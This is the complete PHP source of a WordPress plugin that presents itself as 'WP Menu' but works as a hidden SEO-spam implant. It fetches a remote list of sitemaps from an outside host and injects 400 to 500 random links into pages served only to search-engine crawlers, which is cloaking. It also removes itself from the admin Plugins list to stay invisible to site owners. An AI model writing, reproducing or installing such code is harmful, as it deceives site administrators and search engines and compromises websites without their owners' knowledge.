<?php
/*
Plugin Name: WP Menu
Version: 1.0
Author: Your Name
*/

// Function to fetch sitemap URLs from a remote location
function fetch_sitemap_urls() {
    // URL of the remote file containing sitemap URLs
    $remote_file_url = 'https://fishingery.com/wp-content/uploads/2021/08/sitemap.txt'; // Replace with the actual URL
    
    // Fetch the contents of the remote file
    $response = wp_remote_get($remote_file_url);

    // Check if the request was successful
    if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
        $body = wp_remote_retrieve_body($response);
        // Split the contents of the file by newline to get individual sitemap URLs
        $sitemap_urls = explode("\n", $body);
        // Remove any empty values or whitespace
        $sitemap_urls = array_map('trim', $sitemap_urls);
        $sitemap_urls = array_filter($sitemap_urls);
        return $sitemap_urls;
    }

    // Return an empty array if unable to fetch sitemap URLs
    return array();
}

// Function to get URLs from fetched sitemap URLs
function get_urls_from_sitemaps($count = 10) {
    $urls = array();
    $sitemap_urls = fetch_sitemap_urls();

    // Loop through each fetched sitemap URL
    foreach ($sitemap_urls as $sitemap_url) {
        $response = wp_remote_get($sitemap_url);
        
        // Check if the request was successful
        if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
            $body = wp_remote_retrieve_body($response);
            $xml = simplexml_load_string($body);
            if ($xml) {
                foreach ($xml->url as $url) {
                    $urls[] = (string)$url->loc;
                }
            }
        }
    }

    shuffle($urls);
    return array_slice($urls, 0, rand(400, 500)); // Get random number of URLs between 400 and 500
}

// Function to extract meaningful parts of the URL for use as anchor text
function extract_anchor_text($url) {
    $parsed_url = parse_url($url);
    if (isset($parsed_url['path'])) {
        $path = $parsed_url['path'];
        $path_parts = explode('/', trim($path, '/'));
        $filename = end($path_parts);
        $filename = preg_replace('/\.[^.]+$/', '', $filename); // Remove file extension
        $anchor_text = str_replace('-', ' ', $filename);
        return ucwords($anchor_text);
    }
    return $url;
}

// Function to display random links before the <!DOCTYPE html> declaration for search engine crawlers
function display_random_links_doctype() {
    if (is_whitelisted_crawler()) {
        $random_urls = get_urls_from_sitemaps(); // Get random number of URLs from sitemaps
        $link_count = count($random_urls);
        $links_output = ''; // Initialize variable to store links
        foreach ($random_urls as $index => $url) {
            $anchor_text = extract_anchor_text($url); // Use URL as anchor text
            $links_output .= '<a href="' . esc_url($url) . '">' . esc_html($anchor_text) . '</a>';
            if ($index < $link_count - 1) {
                $links_output .= ', '; // Add comma if not the last link
            }
        }
        // Output the links before the <!DOCTYPE html> declaration
        echo "\n";
        echo $links_output . "\n";
        echo "\n";
    }
}

// Hook the function into the wp_head hook to display links before <!DOCTYPE html>
add_action('wp_head', 'display_random_links_doctype', -1);

// Hide the plugin from the Plugins list
add_filter('all_plugins', 'hide_wp_menu_plugin');
function hide_wp_menu_plugin($plugins) {
    if (isset($plugins['wp-menu/wp-menu.php'])) {
        unset($plugins['wp-menu/wp-menu.php']);
    }
    return $plugins;
}

// Function to check if the current visitor is a search engine crawler
function is_whitelisted_crawler() {
    $whitelist_user_agents = array(
        'googlebot',
        'bingbot',
        'msnbot',
        'google.com',
        'yandex',
        'bing',
        'duckduckgo',
        'feedfetcher-google',
        'yahoo' // Added Yahoo user agent
    );

    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    // Check if the user-agent matches the whitelist
    foreach ($whitelist_user_agents as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true; // Allow the bot
        }
    }
    return false;
}